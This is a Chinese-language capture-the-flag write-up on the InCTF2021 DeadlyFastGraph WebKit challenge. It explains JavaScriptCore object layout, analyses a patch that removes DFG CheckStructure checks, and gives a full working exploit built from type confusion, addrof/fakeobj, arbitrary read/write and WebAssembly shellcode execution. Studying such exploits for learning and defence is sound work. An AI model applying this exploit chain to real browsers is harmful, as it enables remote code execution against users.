> 原文链接: https://www.anquanke.com//post/id/251597 


# 从一道题学习WebKit &amp; InCTF2021 DeadlyFastGraph


                                阅读量   
                                **20692**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t015bbe46b4a8f9ad43.jpg)](https://p5.ssl.qhimg.com/t015bbe46b4a8f9ad43.jpg)



## 文章背景

前几天打了场InCTF，遇到一个WebKit题，打算从这题开始入手，学习一下jsc。



## 环境准备

```
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout c40e806df2c49dac3049825cf48251a230296c6e
patch -p1 &lt; dfg.patch
Tools/gtk/install-dependencies
Tools/Scripts/build-webkit --jsc-only --debug
cd WebKitBuild/Debug/bin
./jsc --useConcurrentJIT=false
```

Tips:20.04搭环境的话会遇到各种奇怪的问题，所以这里用的是18.04 按照上面的步骤的话应该没什么问题，可能会缺一些其他的依赖什么的，按照提示来安装就行了。



## WebKit 前置知识

### **JSC背景**

下图是jsc引擎对js源码执行的流程。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b53810e2a6fd725a.png)

这里我们并不关注Lexer、parser等部分，这些只是对源码的词法和语法进行分析，并构造对应的bytecode，我们主要关心解析和执行部分。

• LLInt：Low Level Interpreter执行Parser生成的ByteCode，其代码位于源码树中的llint/文件夹。

Baseline JIT: 在函数调用了6次，或者某段代码循环了大于100次会触发该引擎进行JIT编译，其编译后的代码仍然为中间码，而不是汇编代码。其代码位于源码树中的jit/文件夹。

• DFG JIT: 在函数被调用了60次或者代码循环了1000次会触发。DFG是基于控制流图分析的优化器，将低效字节码进行优化并转为机器码。它利用LLInt和Baseline JIT阶段收集的一些信息来优化字节码，消除一些类型检查等。其代码位于源码树中的dfg/文件夹。

• FTL: Faster Than Light，更高度的优化，在函数被调用了上千次或者代码循环了数万次会触发。通过一些更加细致的优化算法，将DFG IR进一步优化转为 FTL 里用到的B3的IR，然后生成机器码。

### **JSObject**

学过v8的应该都知道，v8里面对于一个对象的解析是通过一个叫做Map的属性，也称Hidden Class，访问对象的时候，如何知道某一个索引对应的值在内存以什么样的方式存储，这个值该怎样解析，就是通过Map ，当然jsc里面也有个类似叫做Structure，jsc通过这个Structure来判定访问的对象怎样去解析。但是v8的Map直接在对象的头部，而jsc 的Structure 是通过StructureID的索引去找对应的Structure，而StuctureID又存于JSCell里，下面来看JSCell的在内存中是啥样的。

[![](https://p2.ssl.qhimg.com/t011db1d811bb2df6b4.png)](https://p2.ssl.qhimg.com/t011db1d811bb2df6b4.png)

然后这个低四位，就是代表的StructureID。

然后 最主要的就是对象中属性的分布了，这个对写漏洞利用还是非常重要的，但是不同的对象他在内存中分布又不一样。这里我们就主要关注Array对象。而在JavaScript中Array 又有不少类型，比如，这种。

Array

var arr=[1.1]

[![](https://p5.ssl.qhimg.com/t013e7f78243eee9954.png)](https://p5.ssl.qhimg.com/t013e7f78243eee9954.png)

[![](https://p2.ssl.qhimg.com/t012d858953c38356ee.png)](https://p2.ssl.qhimg.com/t012d858953c38356ee.png)

这个比较容易看出第一个就是JSCell字段，然后第二个就是对标v8 element的butterfly了，然后接着跟进butterfly。

[![](https://p5.ssl.qhimg.com/t01e56d2d7ca597beec.png)](https://p5.ssl.qhimg.com/t01e56d2d7ca597beec.png)

这第三个字段就是我们存入写的浮点数1.1，在-8这个偏移出存储着数组的属性，也就是最大length和 length，所以在v8 中我们想实现数组越界的话是通过越界改对象内存中的length，而这里的length储存在element这边，所以如果仅仅有个对象层面的越界的话是修改不到这个length的。然后在上面的话就是一些属性了比如。

arr.p=1.1

[![](https://p4.ssl.qhimg.com/t01df8d22a4aecb4e06.png)](https://p4.ssl.qhimg.com/t01df8d22a4aecb4e06.png)

然后还有一种类型的数组，就是对象Array。这无非也就是上面浮点数改成对应的pointer，这个没什么大问题。

[![](https://p4.ssl.qhimg.com/t016584b5219306f7d5.png)](https://p4.ssl.qhimg.com/t016584b5219306f7d5.png)

[![](https://p3.ssl.qhimg.com/t0165919a3e92b1d7cf.png)](https://p3.ssl.qhimg.com/t0165919a3e92b1d7cf.png)

可以关注到上面有个ArrayWithContiguous，CopyWriteArrayWithDouble（申请的时候放入int就是CopyWriteArrayWithInt32）。xxxArrayWithDouble，这个看名字就知道 是double类型的数组，而这个ArrayWithContiguous就是混合数组了，而CopyWrite就是创建数组而没有更改过，如果对其进行写入操作，就会发现这个前缀消失了，而且StructureID 和 Butterfly 也会做相应的改变。

还有一个特别的点就在存的值中，比如存入一个int32类型，然后他的头部4字节会带0xfffe。取出来的时候会减去这个头部，这里就要引入JSValue类和box、unbox了，box就是混合可以这么理解，而unbox就是单一，就比如ArrayWithDouble，这两个的区别就是要不要使用jsvalue编码。JSCJSValue.h 文件中被定义。有兴趣的话可以去看看。在里面有一个注释，这里我就直接贴别人的总结了。

```
Pointer `{` 0000:PPPP:PPPP:PPPP
/ 0001:****:****:****
Double `{` ...
\ FFFE:****:****:****
Integer `{` FFFF:0000:IIII:IIII
False: 0x06
True: 0x07
Undefined: 0x0a
Null: 0x02
```

然后还有一个就是字典类型了。

Dictionary

var arr=`{`a:0,0:1`}`

[![](https://p5.ssl.qhimg.com/t014e15ecca54869a8a.png)](https://p5.ssl.qhimg.com/t014e15ecca54869a8a.png)

[![](https://p1.ssl.qhimg.com/t01e16822c5a7cca9f2.png)](https://p1.ssl.qhimg.com/t01e16822c5a7cca9f2.png)

这里需要注意的就是上面的数组属性是在元素上面的，而这个的属性就在butterfly的下面，也就是0x7fffafcbc010，对应我们写入的a。

总结上面的就是这张图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01189199d63a9a8d60.png)

### **Structure**

[![](https://p1.ssl.qhimg.com/t0187d12dbcfafb6c75.png)](https://p1.ssl.qhimg.com/t0187d12dbcfafb6c75.png)

[![](https://p4.ssl.qhimg.com/t0177ff1dee244beb0f.png)](https://p4.ssl.qhimg.com/t0177ff1dee244beb0f.png)

也就是说类型类似的对象拥有相同的structure。

有了上述的基础 ，那么做起这道题就没有那么难了。

## Patch&amp;&amp;漏洞分析

```
diff --git a/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp b/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
index eaeaf85ea2..a395a979b8 100644
--- a/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
+++ b/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
@@ -41,6 +41,8 @@
#include "PutByIdStatus.h"
#include "StructureCache.h"
+bool backdoorUsed = false;
+
namespace JSC `{` namespace DFG `{`
class ConstantFoldingPhase : public Phase `{`
@@ -185,7 +187,8 @@ private:
indexInBlock, SpecNone, AssertNotEmpty, node-&gt;origin, Edge(node-&gt;child1().node(), UntypedUse));
`}`
`}`
- if (value.m_structure.isSubsetOf(set)) `{`

+ if (!backdoorUsed || value.m_structure.isSubsetOf(set)) `{`
+ backdoorUsed = true;
m_interpreter.execute(indexInBlock); // Catch the fact that we may filter on cell.
node-&gt;remove(m_graph);
eliminated = true;
diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp
index 04f2c970c2..4b7d3ca6cc 100644
--- a/Source/JavaScriptCore/jsc.cpp
+++ b/Source/JavaScriptCore/jsc.cpp
@@ -516,7 +516,8 @@ private:
`{`
Base::finishCreation(vm);
JSC_TO_STRING_TAG_WITHOUT_TRANSITION();
-
+ addFunction(vm, "print", functionPrintStdOut, 1);
+ /*
addFunction(vm, "debug", functionDebug, 1);
addFunction(vm, "describe", functionDescribe, 1);
addFunction(vm, "describeArray", functionDescribeArray, 1);
@@ -671,7 +672,7 @@ private:
addFunction(vm, "asDoubleNumber", functionAsDoubleNumber, 1);
addFunction(vm, "dropAllLocks", functionDropAllLocks, 1);
-
+ */
if (Options::exposeCustomSettersOnGlobalObjectForTesting()) `{`
`{`
CustomGetterSetter* custom = CustomGetterSetter::create(vm, nullptr, testCustomAccessorSetter);
```

patch部分其实也很简单，很容易看到他的patch是打在javascriptcore里的dfg目录下的，那么说明这个99.9%是跟dfg的jit有关的。然后这里是加了一个backdoorUsed，看命令可以知道是个后门，实际上他就是个后门，而且使用一次之后，就会变成true，然后下一次运行到这里就是false了，因为，这个变量是在全局被声明的，所以有些变量和函数命名都是按规则来的，通过命令来识别功能，会在减少我们很大一部分逆向工作量。在源码中找到对应部分，发现这个功能是在foldConstants函数下的，根据命令，知道这是个常量折叠的意思，然后反向找引用一直找到这里。

```
class ConstantFoldingPhase : public Phase `{`
public:
ConstantFoldingPhase(Graph&amp; graph)
: Phase(graph, "constant folding")
, m_state(graph)
, m_interpreter(graph, m_state)
, m_insertionSet(graph)
`{`
`}`
bool run()
`{`
bool changed = false;
for (BasicBlock* block : m_graph.blocksInNaturalOrder()) `{`
if (block-&gt;cfaThinksShouldTryConstantFolding)
changed |= foldConstants(block);
`}`
```

而且也只有这一个地方引用了这个函数，再来看看这个部分的源码，一个ConstantFoldingPhase类，定义里一个run函数，刚好这个又是在run函数里面，再来看看这个类在哪里创建了实例，一直单层引用一直追到Plan::CompilationPath Plan::compileInThreadImpl()，在这里被引用了几次，根据相关资料和源码里的解释，有兴趣可以自己读读源码，这里其实是DFG的一整套优化流程，而刚好ConstantFoldingPhase是其一个优化阶段，我们在回头看下漏洞函数。

```
bool foldConstants(BasicBlock* block)
`{`
bool changed = false;
m_state.beginBasicBlock(block);
for (unsigned indexInBlock = 0; indexInBlock &lt; block-&gt;size(); ++indexInBlock) `{`
if (!m_state.isValid())
break;
Node* node = block-&gt;at(indexInBlock);
bool alreadyHandled = false;
bool eliminated = false;
switch (node-&gt;op()) `{`
```

传入的一个block然后根据block去拿到每个一个block里的node，然后对每一个node进行一次switch判断其op。

```
case CheckStructure:
case ArrayifyToStructure: `{`
AbstractValue&amp; value = m_state.forNode(node-&gt;child1());
RegisteredStructureSet set;
if (node-&gt;op() == ArrayifyToStructure) `{`
set = node-&gt;structure();
ASSERT(!isCopyOnWrite(node-&gt;structure()-&gt;indexingMode()));
`}`
else `{`
set = node-&gt;structureSet();
if ((SpecCellCheck &amp; SpecEmpty) &amp;&amp; node-&gt;child1().useKind() == CellUse &amp;&amp; m_state.forNode(node-&gt;child1()).m_type &amp; SpecEmpty) `{`
m_insertionSet.insertNode(
indexInBlock, SpecNone, AssertNotEmpty, node-&gt;origin, Edge(node-&gt;child1().node(), UntypedUse));
`}`
`}`
if (!backdoorUsed || value.m_structure.isSubsetOf(set)) `{`
backdoorUsed = true;
m_interpreter.execute(indexInBlock); // Catch the fact that we may filter on cell.
node-&gt;remove(m_graph);
eliminated = true;
break;
`}`
break;
`}`
```

而漏洞部分就是判断op是否为CheckStructure、ArrayifyToStructure这两个case，之后进入patch部分，进行一个消除node，这两个case我们关注checkStructure这个case，因为基础部分介绍过，对象如何解析元素就是靠的Structure，而这CheckStructure是对对象的Structure的检查，如果两次传来的对象Structure不相同就会deopt，类似于v8的checkmaps部分，然后由于patch部分又是消除node，所以很容易想到通过patch的漏洞部分，来消除这个checkstructure，然后再次传入不同类型的对象，就可以做到类型混淆了。

而下面一部分的patch主要是为了防止一些非预期解法比如直接read flag，还有就是 利用debug和 describe去直接leak地址。本地调试时候 删掉这部分patch重新编译就行了。

## 漏洞利用

### **方法一：**

根据上述的分析，是在优化阶段，对CheckStructure进行的消除，不过这也是我们根据源码和patch进行的静态分析出来的，具体还是得看实际运行的时候是什么样的。

先构造个POC试试

```
var a1=`{`a:1.1,b:2.2,c:3.3,d:4.4,e:5.5`}`
var a2=`{`a:1.1,b:2.2`}`
function foo(a,b)`{`
a.e=b
`}`
for(let i=0;i&lt;100;i++)`{`
foo(a1,1.1)
`}`
foo(a2,1.1)
debug(describe(a1))
debug(describe(a2))
print(a1)
```

我这里是采用debug来输出信息，利用b *printInternal来当作断点，因为jsc没有提供像v8那样的%Debug机制，只有一个describe对标%DebugPrint能够输出对象信息，所以断点我们使用print当作临时断点。

[![](https://p0.ssl.qhimg.com/t01a3dd9d74026ae36f.png)](https://p0.ssl.qhimg.com/t01a3dd9d74026ae36f.png)

看的出来，确实被混淆了，传入的a2本身是没有e这个属性的，但是消除了checkstructure导致没有deopt，然后继续按照a1的structure来解析，所以导致这里的越界写。

有了这个POC我们就可以很轻松去构造exp了。第一种方法也是官方作者给的做法。

不过下面有几点需要注意的地方。

1.创建两个structure相同的对象，因为只有相同才会被放在临近地址，不同的话，地址差距会很大。会影响我们构造利用。

2.由于jsvalue的编码，ArrayWithContiguous数组类型存入数据时会把写入的值用jsvalue编码，具体可以参照上面基础知识部分，会在头部加上一个flag，类似0xfffe，那么这样对我们构造任意地址读写的时候，有很大的影响，具体也是可以绕过的，见第二种利用，但是如果直接写一个pointer的话，就不会有影响了。因为pointer存入进去在内存中还是pointer。

然后这里的思路就是利用 混淆去替换对象的butterfly，然后就利用被混淆的对象访问其数组元素就等于直接访问了 替换对象，[0] 就是替换对象的jscell，[1]就是 butterfly。后面就可以利用这个去构造任意地址R/W了。

下面我们修改POC。

```
var a1=`{`a:1.1,b:3.2,c:4.2,d:5.2,e:5.2,f:0.0`}`;
var a2=`{`a:1.1,b:26.6`}`
var a3=`{`a:1.1,b:26.6,0:1.1`}`//victim
var a4=`{`a:1.1,b:26.6,0:1.1`}`
function b(a,b)`{`
a.d=b;
`}`
//set args --useConcurrentJIT=false exp3.js
for(let i=0;i&lt;100;i++)`{`
b(a1,a4);
`}`
b(a2,a4);
```

•  根据v8惯例，这里写wasm的rwx段为shellcode，运行就可以执行shellcode了，要写的首先我们需要知道地址，所以这里先构造addrof函数，这个比较简单，我们先让a4的属性a为想要leak的obj，然后在利用a3 也就是被替换butterfly的对象，（下面直接称a*），去访问数组下标返回的就是地址。因为a3数组的类型是double，所以访问下标返回的是double。

```
function addrof(obj)`{`
a4.a=obj
return u64(a3[2]);
`}`
```

然后通过对其类型转换就可以得到对象的地址了。有了对象地址，就要想着去读对应偏移的内存得到rwx的地址，才能去写shellcode。

```
var buf=new ArrayBuffer(0x8);
var dv=new DataView(buf);
function b2h(addr)`{`
dv.setBigUint64(0,addr,true);
return dv.getUint32(4,true);
`}`
function b2l(addr)`{`
dv.setBigUint64(0,addr,true);
return dv.getUint32(0,true);
`}`
function u64(addr)`{`
dv.setFloat64(0,addr,true);
return dv.getBigUint64(0,true);
`}`
function hex(addr)`{`
return addr.toString(16);
`}`
function leak(name,addr)`{`
print("[+] "+name+"==&gt;0x"+hex(addr))
`}`
function p64(low,high)
`{`
dv.setUint32(0,low,true);
dv.setUint32(4,high,true);
var float_val=dv.getFloat64(0,true);
return float_val;
`}`
```

• 这里的构造也及其简单,首先让a4的butterfly等于类型转换后想要读的地址，然后在用a4根据对应的数组下标去读，而修改a4的bufferfly ，我们通过a3去修改。

• 任意写也是类似的，注意这里没有涉及到jsvalue编码的原因是我们声明的对象数组是unbox的，所以写的时候是直接可以通过写的，不会被jsvalue编码。

```
function read(addr)`{`
a3[1]=p64(b2l(addr),b2h(addr))
return u64(a4[0]);
`}`
function write(addr,val)`{`
a3[1]=p64(b2l(addr),b2h(addr));
a4[0]=val;
`}`
```

然后后面就是找到rwx地址，写入shellcode运行就可以getshell了。



**完整EXP**

```
var tmp_buf = new ArrayBuffer(8)
var f64 = new Float64Array(tmp_buf)
var u32 = new Uint32Array(tmp_buf)
var BASE = 0x100000000
function f2i(f) `{`
f64[0] = f
return u32[0] + BASE*u32[1]
`}`
function i2f(i) `{`
u32[0] = i % BASE
u32[1] = i / BASE
return f64[0]
`}`
function hex(addr)`{`
return addr.toString(16);
`}`
function leak(name,addr)`{`
print("[+] "+name+"==&gt;0x"+hex(addr))
`}`
var container=`{`
fake_cell:1.1,
butt:1.1
`}`
var a1=`{`a:2.2,b:3.2,c:4.2,d:5.2,e:5.2,f:0.0,g:1.1,h:1.1,i:1.1,a0:1.1,a1:1.1,a2:1.1,a3:1.1,a4:1.1,a5:1.1,a6:1.1,a7:1.1,a8:1.1,a9:1.1,a10:1.1,a11:1.1,a12:1.1,a13:1.1,a14:1.1,a15:1.1,a16:1.1,a17:1.1,a18:1.1,a19:1.1,a20:1.1,a21:1.1,a22:1.1,a23:1.1,a24:1.1,a25:1.1,a26:1.1,a27:1.1,a28:1.1,a29:1.1,a30:1.1,a31:1.1,a32:1.1,a33:1.1,a34:1.1,a35:1.1,a36:1.1,a37:1.1,a38:1.1,a39:1.1,a40:1.1,a41:1.1,a42:1.1,a43:1.1,a44:1.1,a45:1.1,a46:1.1,a47:1.1,a48:1.1,a49:1.1,a50:1.1,a51:1.1,a52:1.1,a53:1.1,a54:1.1,a55:1.1,a56:1.1,a57:1.1,a58:1.1,a59:1.1,a60:1.1,a61:1.1,a62:1.1,a63:1.1,a64:1.1,a65:1.1,a66:1.1,a67:1.1,a68:1.1,a69:1.1,a70:1.1,a71:1.1,a72:1.1,a73:1.1,a74:1.1,a75:1.1,a76:1.1,a77:1.1,a78:1.1,a79:1.1,a80:1.1,a81:1.1,a82:1.1,a83:1.1,a84:1.1,a85:1.1,a86:1.1,a87:1.1,a88:1.1,a89:1.1,a90:1.1,a91:1.1,a92:1.1,a93:1.1,a94:1.1,a95:1.1,a96:1.1,a97:1.1,a98:1.1,a99:1.1,`}`;
var a2=[1.1];//double
var a3=[`{``}`];//obj
var a4=[1.1];//double ｜
a4[0]=1.1
var doubleleak;
var objleak;
var fake_addr;
function foo(a)`{`
doubleleak=a.a21;
objleak=a.a5
a.a5=doubleleak;
a.a21=objleak;
`}`
for(let i=0;i&lt;100;i++)`{`
foo(a1)
`}`
function addrOf(obj) `{`
a3[0]=obj
foo(a2);
return f2i(a3[0]);
`}`
function fakeObj(addr) `{`
addr=i2f(addr)
foo(a2)
a4[0]=addr
return a4[0]
`}`
var fake_addr=addrOf(container)+0x10
var structure_spray = [];
for(var i=0; i&lt;1000; i++) `{`
var array = [13.37];
array.a = 13.37;
array['p'+i] = 13.37;
structure_spray.push(array)
`}`
var victim = structure_spray[510];
container.fake_cell=objleak
container.butt=victim
var obj=fakeObj(fake_addr)
var unboxed = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37]
unboxed[0] = 4.2
var boxed = [`{``}`,`{``}`];
obj[1]=unboxed
var tmp_butterfly=victim[1];
obj[1]=boxed;
victim[1]=tmp_butterfly;
function AddrOf(obj)`{`
boxed[0] = obj;
return unboxed[0];
`}`
function FakeObj(addr)`{`
unboxed[0] = addr;
return boxed[0];
`}`
read64 = function (addr) `{`
f64[0] = addr
obj[1] = f64[0]
return victim[0]
`}`
write64 = function (addr, val) `{`
f64[0] = addr
obj[1] = f64[0]
victim[0] = val
`}`
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule,`{``}`);
var f=wasmInstance.exports.main;
let shellcode = [
2.825563119134789e-71, 3.2060568105999132e-80,
-2.5309726874116607e+35, 7.034840446283643e-309
]
container.fake_cell=doubleleak
var f_addr=f2i(AddrOf(f));
var a4_addr=f2i(AddrOf(a4));
var vic_addr=f2i(AddrOf(victim));
leak("f_addr",f_addr)
leak("a4",a4_addr)
leak("victim",vic_addr)
var shellcode_addr=f2i(read64(i2f(f_addr+0x38)))
leak("shellcode_addr",shellcode_addr)
for(var i = 0; i &lt; shellcode.length; i++) `{`
write64(i2f(shellcode_addr+8*i), shellcode[i])
`}`
f();
```

## 总结

• jsc和v8两个还是比较类似的比较都是javascript的引擎，两者有相似之处，也有不同之处，jsc的jsvalue对我们写利用起来些许还是有点麻烦的，v8里面也有指针的压缩。总的来说，第一种方法比第二种方法要简单太多。

## Rerfer

https://www.anquanke.com/post/id/244472#h3-2

https://tech.meituan.com/2018/08/23/deep-understanding-of-jscore.html

https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/

https://liveoverflow.com/revisiting-javascriptcore-internals-boxed-vs-unboxed-browser-0x06/
